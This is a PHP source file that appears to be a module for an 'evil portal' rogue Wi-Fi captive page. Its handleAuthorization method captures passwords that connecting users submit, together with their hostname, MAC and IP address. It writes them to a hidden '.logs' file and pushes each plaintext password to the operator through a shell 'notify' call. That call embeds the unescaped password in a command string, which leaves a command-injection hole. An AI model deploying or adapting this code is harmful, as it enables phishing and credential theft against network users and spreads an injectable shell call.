<?php
namespace evilportal;

class MyPortal extends Portal
{
    public function handleAuthorization()
    {
        if (isset($_POST['password'])) {
            $password = $_POST['password'];
            $hostname = isset($_POST['hostname']) ? $_POST['hostname'] : 'unknown';
            $mac = isset($_POST['mac']) ? $_POST['mac'] : 'unknown';
            $ip = isset($_POST['ip']) ? $_POST['ip'] : 'unknown';

            $reflector = new \ReflectionClass(get_class($this));
            $logPath = dirname($reflector->getFileName()) . "/.logs";

            file_put_contents($logPath, "[" . date('Y-m-d H:i:s') . "Z]\nPassword: {$password}\nHostname: {$hostname}\nMAC: {$mac}\nIP: {$ip}\n\n", FILE_APPEND | LOCK_EX);

            $this->execBackground("notify 'Password: {$password}'");
        }

        parent::handleAuthorization();
    }

    public function onSuccess()
    {
        parent::onSuccess();
    }

    public function showError()
    {
        parent::showError();
    }
}
